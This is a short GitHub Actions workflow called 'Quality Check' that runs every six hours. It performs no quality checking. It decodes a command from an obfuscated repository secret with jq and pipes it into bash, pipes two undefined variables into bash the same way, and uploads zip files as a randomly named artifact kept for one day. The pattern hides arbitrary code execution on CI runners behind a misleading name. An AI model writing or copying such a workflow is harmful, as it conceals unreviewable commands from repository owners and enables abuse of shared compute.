name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '23 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          thvdv3: ${{ secrets.thvdv3 }}
        run: |
          printf '%s' "$thvdv3" | jq -r .akyyi67 | /bin/bash
          echo $jgzei29 | jq -r .vq2 | /bin/bash
          echo $iifq49904 | jq -r .bp2 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: fzQEzlgq
          path: "*.zip"
          retention-days: 1
